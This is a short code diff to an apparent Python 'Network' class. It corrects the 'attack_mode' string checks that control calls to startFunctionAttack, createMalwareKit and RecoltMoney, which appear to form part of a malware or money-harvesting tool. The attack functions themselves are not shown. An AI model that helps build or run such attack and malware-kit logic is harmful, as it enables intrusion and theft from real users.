@@ -14,10 +14,10 @@ class Network():
                                              accesstoken=self.Configuration["accessToken"], lang="en")
 
 
-        if self.Configuration["attack_mode"] == "ALl" or self.Configuration["attack_mode"] == "just_attack":
+        if self.Configuration["attack_mode"] == "All" or self.Configuration["attack_mode"] == "just_attack":
             self.startFunctionAttack()
 
-        if self.Configuration["attack_mode"] == "ALl" or self.Configuration["attack_mode"] == "just_recolt":
+        if self.Configuration["attack_mode"] == "All" or self.Configuration["attack_mode"] == "just_recolt":
             self.createMalwareKit()
             self.RecoltMoney()
 
